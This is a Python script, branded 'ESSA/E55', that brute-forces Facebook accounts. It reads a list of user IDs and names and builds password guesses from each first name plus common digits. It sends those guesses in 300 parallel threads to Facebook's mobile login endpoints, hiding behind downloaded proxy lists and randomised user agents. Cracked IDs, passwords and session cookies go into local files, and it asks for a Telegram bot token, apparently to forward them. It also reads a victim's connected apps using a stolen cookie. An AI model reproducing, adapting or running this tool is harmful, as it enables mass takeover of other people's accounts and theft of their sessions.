#-----------{ IMPORT MODULES }----------#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from bs4 import BeautifulSoup as sop
import urllib3,rich,base64
pretty.install()
CON=sol()

#-----------{ ESSA }---------------#
import os, platform, time, sys

print(" \033[38;5;63m Waiting...")
time.sleep(0.5)
#os.system(f'xdg-open https://t.me/ess_coder')
#------------------[ USER-AGENT ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/socks5.txt').text
    open('.socks5.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/socks4.txt').text
    open('.socks4.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://github.com/Chigozieworldwide/KING/blob/main/https.txt').text
    open('.https.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/http.txt').text
    open('.http.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/http.txt').text
    open('.http.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/https.txt').text
    open('.https.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/socks4.txt').text
    open('.socks4.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/socks5.txt').text
    open('.socks5.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/http.txt').text
    open('.http.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/https.txt').text
    open('.https.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/socks4.txt').text
    open('.socks4.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()

try:
    prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/socks5.txt').text
    open('.socks5.txt','w').write(prox) 
except Exception as e:

    prox=open('.proxy.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
 
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ ESSA   ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\033[38;5;75m' # DEFAULT
m = '\033[38;5;25m' #RED +
k = '\033[38;5;42m' # KUNING +
h = '\033[38;5;66m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[38;5;54m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
op='\033[38;5;1m'
fs='\033[38;5;1m'
ds='\033[38;5;3m'

###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"



#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    menu()

#--------------[ LOGO-E55 ]-------------#
logo ="""
\033[38;5;69m
███████ ███████ ███████  █████  
██      ██      ██      ██   ██ 
█████   ███████ ███████ ███████ 
██           ██      ██ ██   ██ 
███████ ███████ ███████ ██   ██ 
          
\033[38;5;78m
◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢
\033[38;5;31m
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
| AUTHOR : ESSA                    |
| GITHUB : ESSA CODER              |
| TOOL : FACEBOOK                  |
| New Update By : Essa             |
| Subscription : Free $            |
| Telegram : e55_coder             |
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\033[38;5;78m
◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢◤◢
"""
print(logo)
clear()

#------------------[ MENU ]----------------#
def menu():
        os.system('clear')
        print(logo)
        ID = input("\033[38;5;18mID Telegram : ")
        token = input(" \033[38;5;18m Token Bot 🤖 : ")
        clear()
        print(logo)
        print(" \033[38;5;69m [1] FILE CLONING")
        print(" \033[38;5;69m [99] EXIT ")
        e55 = input(" \033[38;5;44mCHOOSE OPTION : ")
        if e55 in ['1','01']:
            crack_file()
        if e55 in ['99','09']:
            exit()
            
        else:
            print('\033[1;37m------------------------------------')
            print(' [👾] Halbzhera? ')
            time.sleep(0.5)
            back()
     
#---------[ CRACK-FROM-FILE ]-----------#
def crack_file():
        o = input('\033[38;5;44m [+] FILE NAME : ')
        try:lin = open(o).read().splitlines()
        except:
            print('\033[38;5;39m [×] FILE DOES NOT EXIST')
            time.sleep(2)
            back()
        for xid in lin:
            id.append(xid)
        setting()
 
 
#-------------[ IDZ ]---------------#
     
def setting():
    print("\033[38;5;23m [1] MIXED ID NEW/OLD ")
    hu = input('\033[38;5;36m[✅] CHOOSE YOUR OPTION  : ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    #print('\033[0;92m^^^^^^^^^^^^^^^^^^^^')
    print('\033[38;5;57m CHOOSE YOUR METODE ׂ╰┈➤')
    print(' \033[38;5;61m  [1] METODE : p.facebook.com')
    print(' \033[38;5;61m  [2] METODE : m.facebook.com')
    print(' \033[38;5;61m  [3] METODE : touch.facebook.com')
    hc = input(' \033[38;5;64m HALBZHERA : ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('mbasic')
    elif hc in ['3','03']:
        method.append('mbasic')
    else:
        method.append('mobile')
    passwrd()
    exit()
    
 
                     
#---------[ BAGIAN-WORDLIST ]-----------#
def passwrd():
        print("")
        print(" \033[38;5;36m [ ESSA ] TODAY DATE :"+date)
        print(' \033[38;5;36m [ ESSA ] TOTAL ID : ',str(len(id)))
        print(" \033[38;5;36m [ ESSA ] TODAY TIME : "+time.strftime("%H:%M")+" "+ tag)
        print(" \033[38;5;36m [ ESSA ] CRACKING STARTED ")
        print('')
        with tred(max_workers=300) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv = []
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(frs+'123')
                        pwv.append(frs+frs)
                        pwv.append(frs+frs+'12345')
                        pwv.append('123'+frs)
                        pwv.append(frs+'1234@')
                        pwv.append(frs+'123$')
                        pwv.append(frs+'123@')
                        pwv.append(frs+'1234$')
                        pwv.append(frs+'12345$')
                        pwv.append(frs+'12345@')
                        pwv.append(frs+'2009@')
                        pwv.append(frs+'2008@')
                        pwv.append(frs+'2007@')
                        pwv.append(frs+'2006@')
                        pwv.append(frs+'2005@')
                        pwv.append(frs+'2004')
                        pwv.append(frs+'2009')
                        pwv.append(frs+'2008')
                        pwv.append(frs+'2007')
                        pwv.append(frs+'2006')
                        pwv.append(frs+'2005')
                        pwv.append(frs+'2004')
                        pwv.append(frs+'2024')
                        pwv.append(frs+'2023')
                        pwv.append(frs+'2022')
                        pwv.append(frs+'1234')
                        pwv.append('1234'+frs)
                        pwv.append(frs+'12345')
                        pwv.append('12345'+frs)
                        pwv.append(frs+'12345678')
                        pwv.append('12345678'+frs)
                        pwv.append(frs+'123456789')
                        pwv.append('123456789'+frs)
                        pwv.append('123'+frs+'123')
                        pwv.append('12345'+frs+'12345')
                        pwv.append(frs+'12345'+frs)
                        pwv.append(frs+'123'+frs)
                        pwv.append(nmf+'12345')
                        pwv.append(frs+'1999')
                        pwv.append(frs+'1998')
                        pwv.append(frs+'1997')
                        pwv.append('1122334455'+frs)
                        pwv.append('11223344'+frs)
                        pwv.append(frs+'1122')
                        pwv.append(frs+'112233')
                        pwv.append(frs+'11223344')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(frs+'123')
                        pwv.append(frs+frs)
                        pwv.append(frs+frs+'12345')
                        pwv.append('123'+frs)
                        pwv.append(frs+'1234')
                        pwv.append('1234'+frs)
                        pwv.append(frs+'1234@')
                        pwv.append(frs+'123@')
                        pwv.append(frs+'123$')
                        pwv.append(frs+'12345@')
                        pwv.append(frs+'2009')
                        pwv.append(frs+'2008')
                        pwv.append(frs+'2007')
                        pwv.append(frs+'2006')
                        pwv.append(frs+'2005')
                        pwv.append(frs+'2004')
                        pwv.append(frs+'2024')
                        pwv.append(frs+'2023')
                        pwv.append(frs+'2022')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'1234$')
                        pwv.append(frs+'12345$')
                        pwv.append(frs+'2009@')
                        pwv.append(frs+'2008@')
                        pwv.append(frs+'2007@')
                        pwv.append(frs+'2006@')
                        pwv.append(frs+'2005@')
                        pwv.append(frs+'2004@')
                        pwv.append('12345'+frs)
                        pwv.append(frs+'12345678')
                        pwv.append('12345678'+frs)
                        pwv.append(frs+'123456789')
                        pwv.append('123456789'+frs)
                        pwv.append('123'+frs+'123')
                        pwv.append('12345'+frs+'12345')
                        pwv.append(frs+'12345'+frs)
                        pwv.append(frs+'123'+frs)
                        pwv.append(nmf+'12345')
                        pwv.append(frs+'1999')
                        pwv.append(frs+'1998')
                        pwv.append(frs+'1997')
                        pwv.append('1122334455'+frs)
                        pwv.append('11223344'+frs)
                        pwv.append(frs+'1122')
                        pwv.append(frs+'112233')
                        pwv.append(frs+'11223344')
                if 'ya' in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if 'mobile' in method:
                    pool.submit(crack,idf,pwv)
                elif 'touch' in method:
                    pool.submit(crackfree,idf,pwv)
                elif 'free' in method:
                    pool.submit(crackfree,idf,pwv)
                elif 'mbasic' in method:
                    pool.submit(cracktouch,idf,pwv)
                else:
                    pool.submit(crackfree,idf,pwv)
                    print('\n\033[1;37m===================================')
                    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
                    print('\033[97;1m[\033[92;1m\033[97;1m] OK :\033[0;92m %s '%(ok))
                    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
                    print('\n\033[1;37m===================================')
                    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER [1] TO BACK')
                    if woi in ['1']:
                      menu()
                    
# SEND HITS TO TELEGRAM ✅
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x,op,fs,ds])
    sys.stdout.write(f"\r[E55-TEST] \033[38;5;80m{Z}{b}{loop}{Z}|{b}{len(id)} \033[38;5;80m[\033[38;5;80mOK∙{ok}\033[38;5;80m]{bo} {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update = {'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'referer': 'https://p.facebook.com/',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://p.facebook.com/login/save-device/'"}
            ses.headers.update = {'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'referer': 'https://p.facebook.com/',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                
                print(f'\r\033[38;5;66m└──[ ESSA-CP 💔] {m}{idf} | {m}{pw} \n {M} \033[38;5;66m└──> \033[38;5;66m{ua} ')
                open('CP/'+cpc,'a').write(idf+' 💔 '+pw+'\n')
                akun.append(idf+' 💔 '+pw)
                cp+=1
                
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                                ok+=1
                                coki=po.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                               
                                print(f'\r\033[38;5;75m└──[ ESSA-OK ✅] {h}{idf} | {h}{pw} \n {h} └──> \033[38;5;75m{kuki}')
                                
                                open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                                open("E55-OK.txt", "a").write(user + "💸" + pw + " 🍪 " + coki + "\n")
                
                
                                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
    
#----------[ METHODE-MBASIC-2 ]---------#
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x,op,fs,ds])
    sys.stdout.write(f"\r[E55-TEST] \033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;208m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;208m]{bo} {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'authority': 'm.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type':'application/x-www-form-urlencoded',
    'origin':'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                            
                            print(f'\r\033[38;5;66m└──[ ESSA-CP 💔] {m}{idf} | {m}{pw} \n {M} \033[38;5;66m└──> \033[38;5;66m{ua} ')
                            open('CP/'+cpc,'a').write(idf+' 💔 '+pw+'\n')
                            akun.append(idf+' 💔 '+pw)
                            cp+=1
                    
                            break
            elif "c_user" in ses.cookies.get_dict().keys():
                                            ok+=1
                                            coki=po.cookies.get_dict()
                                            kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                            
                                            print(f'\r\033[38;5;75m└──[ ESSA-OK ✅] {h}{idf} | {h}{pw} \n {h} └──> \033[38;5;75m{kuki}')
                                            
                                            open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                                            open("E55-OK.txt", "a").write(user + "💸" + pw + " 🍪 " + kuki + "\n")
                                            break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1

def login2():
    passwords = input(" \033[38;5;63m Enter Password : ")
    if passwords in ["000"]:
        print(" \033[38;5;69m Login Success")
        time.sleep(2)
        menu()
def login():
    username = input(" \033[38;5;50m Enter Username : ")
    if username in ["E55"]:
        login2()
    else:
        print("\033[38;5;44m Username is wrong")
        time.sleep(1)
        exit()
#--------[ CHECK-APPS ]----------#

def e55apps():
 session = requests.Session()
 w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
 sop = bs4.BeautifulSoup(w,"html.parser")
 x = sop.find("form",method="post")
 game = [i.text for i in x.find_all("h3")]
 try:
  for i in range(len(game)):
   print ("\r%s  \033[0m  %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 except AttributeError:
  print ("\r    %s\033[0m cookie invalid"%(M))
 w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
 sop = bs4.BeautifulSoup(w,"html.parser")
 x = sop.find("form",method="post")
 game = [i.text for i in x.find_all("h3")]
 try:
  for i in range(len(game)):
   print ("\r%s  \033[0m  %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
 except AttributeError:
  print ("\r    %s \033[0mcookie invalid"%(M))
  
#--------[ SYSTEM-CONTROL ]----------#

if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
login()